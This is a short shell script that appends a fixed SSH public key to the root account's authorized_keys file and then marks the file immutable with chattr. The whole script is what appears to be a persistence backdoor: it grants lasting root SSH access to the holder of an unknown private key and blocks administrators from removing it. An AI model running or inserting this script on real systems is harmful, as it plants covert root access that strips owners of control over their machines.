#!/bin/sh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE1kc1uH0NvN9BSMYmyJfaV84bD3JR9EItb4jYbTqZRM' >> /root/.ssh/authorized_keys
chattr +i /root/.ssh/authorized_keys
